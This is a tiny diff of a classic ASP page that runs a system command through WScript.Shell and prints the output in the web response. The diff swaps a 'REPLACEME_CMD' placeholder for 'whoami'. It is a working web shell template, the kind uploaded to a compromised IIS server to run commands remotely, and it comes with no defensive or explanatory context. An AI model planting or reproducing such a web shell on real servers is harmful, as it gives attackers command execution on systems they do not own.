@@ -1,6 +1,6 @@
 <%
 Set rs = CreateObject("WScript.Shell")
-Set cmd = rs.Exec("REPLACEME_CMD")
+Set cmd = rs.Exec("whoami")
 o = cmd.StdOut.Readall()
 Response.write(o)
 %>
